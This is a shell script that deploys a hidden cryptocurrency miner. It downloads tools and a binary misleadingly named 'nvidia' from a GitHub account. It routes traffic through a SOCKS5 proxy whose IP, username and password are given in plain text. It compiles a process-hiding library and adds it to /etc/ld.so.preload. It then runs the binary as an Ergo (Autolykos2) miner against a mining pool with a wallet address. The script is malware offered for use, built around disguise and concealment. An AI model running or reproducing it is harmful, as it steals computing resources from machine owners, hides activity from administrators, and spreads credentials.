#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 52.15.235.202:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
chmod +x nvidia

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
unzip magicNvidia.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./nvidia --algo AUTOLYKOS2 --pool stratum-ergo.flypool.org:3443 --user 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.Nvidia --dns-over-https 2 --tls on --longstats 5 --shortstats 5 --timeprint on --log on --basecolor
